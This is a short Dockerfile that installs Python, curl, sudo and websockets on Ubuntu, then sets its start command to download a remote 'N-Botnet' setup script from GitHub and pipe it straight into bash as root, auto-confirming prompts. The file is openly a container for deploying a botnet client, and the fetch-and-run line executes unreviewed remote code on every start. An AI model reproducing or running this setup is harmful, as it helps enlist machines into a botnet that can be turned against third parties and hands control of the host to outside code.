FROM ubuntu:22.04

# Prevent interactive prompts during apt install
ENV DEBIAN_FRONTEND=noninteractive
ENV TZ=Etc/UTC

# Install all required packages in one layer
RUN apt update && apt install -y \
    python3 \
    python3-pip \
    curl \
    wget \
    git \
    build-essential \
    sudo \
    && apt clean \
    && rm -rf /var/lib/apt/lists/* \
    && pip3 install websockets

# Set working directory
WORKDIR /root/n-botnet

# Run the N-Botnet setup script and client on container start
# "yes |" prevents hanging if apt prompts for confirmation
CMD ["bash", "-c", "yes | bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/n-botnet.sh)"]
